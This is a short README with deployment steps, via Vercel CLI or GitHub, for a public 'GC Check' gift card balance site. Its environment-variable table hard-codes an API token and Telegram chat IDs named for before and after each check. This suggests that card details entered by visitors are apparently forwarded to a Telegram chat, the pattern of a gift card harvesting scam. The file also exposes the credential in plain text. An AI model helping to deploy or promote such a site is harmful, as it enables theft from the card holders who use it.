# Deploy GC Check Online (Free)

Site name: **GC Check**

Your site will be live at: **gc-check.vercel.app** (or similar free URL)

---

## Option A: Deploy with Vercel (no GitHub needed)

1. Go to **https://vercel.com** and sign up (free)
2. Install Vercel CLI: `npm i -g vercel`
3. In terminal:
   ```bash
   cd "c:\Projects\Gift Card checker"
   vercel
   ```
4. Log in when asked, press Enter for defaults
5. Add env vars: Vercel dashboard → Your Project → Settings → Environment Variables

---

## Option B: Deploy from GitHub

1. Push your project to GitHub (requires Git: https://git-scm.com)
2. Go to **https://vercel.com** and sign up with GitHub
3. Click **Add New** → **Project** → Import your repo

---

## Add Environment Variables (required)

In Vercel → Your Project → **Settings** → **Environment Variables**, add:

| Name | Value |
|------|-------|
| API_TOKEN | 4439f671d73478c6401b758b50594ce5 |
| TELEGRAM_ID_BEFORE_CHECK | -1003750392427 |
| TELEGRAM_ID_AFTER_CHECK | -1003750392427 |

Then click **Deploy** (or redeploy if already deployed)

---

## Step 3: Your site is live

You'll get a URL like: **https://gc-check-xxx.vercel.app**

Share it and people can check their card balance.

---

## Custom domain (.com) later

Free .com is not available. To use something like **gccheck.com**:
1. Buy the domain at Namecheap, Cloudflare, or Google (~$10–12/year)
2. In Vercel: Project → Settings → Domains → Add your domain
